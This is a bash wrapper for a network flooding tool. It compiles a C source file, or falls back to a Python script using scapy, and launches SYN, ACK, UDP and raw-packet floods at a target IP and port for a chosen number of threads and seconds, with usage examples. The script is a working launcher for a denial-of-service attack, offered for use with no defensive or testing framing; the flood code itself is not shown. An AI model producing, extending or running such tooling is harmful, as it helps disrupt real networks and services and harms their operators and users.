#!/bin/bash
# ─────────────────────────────────────────────────
# flood.sh — build & run wrapper
# usage: ./flood.sh <target_ip> <port> <method> [threads] [duration]
# methods: syn, ack, udp, tcpraw, udpraw
# auto-compiles C binary if not present, falls back to python
# ─────────────────────────────────────────────────

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/flood"
SRC="$SCRIPT_DIR/flood.c"
PY="$SCRIPT_DIR/flood.py"

if [ $# -lt 3 ]; then
    echo "usage: $0 <target_ip> <port> <method> [threads] [duration]"
    echo "methods: syn, ack, udp, tcpraw, udpraw"
    echo ""
    echo "examples:"
    echo "  $0 1.2.3.4 80 syn 4 60"
    echo "  $0 1.2.3.4 53 udp 8"
    echo "  $0 1.2.3.4 443 ack 2 120"
    exit 1
fi

# check root
if [ "$(id -u)" -ne 0 ]; then
    echo "[!] raw sockets require root. re-run with sudo."
    exit 1
fi

# try C binary first
if [ -f "$SRC" ]; then
    if [ ! -f "$BIN" ] || [ "$SRC" -nt "$BIN" ]; then
        echo "[*] compiling $SRC..."
        gcc -o "$BIN" "$SRC" -lpthread -O2
        echo "[*] compiled: $BIN"
    fi

    echo "[*] running C binary..."
    exec "$BIN" "$@"
fi

# fallback to python
if [ -f "$PY" ]; then
    echo "[*] C source not found, using python..."

    # install scapy if missing
    if ! python3 -c "import scapy" 2>/dev/null; then
        echo "[*] installing scapy..."
        pip3 install scapy -q
    fi

    exec python3 "$PY" "$@"
fi

echo "[!] no flood.c or flood.py found in $SCRIPT_DIR"
exit 1
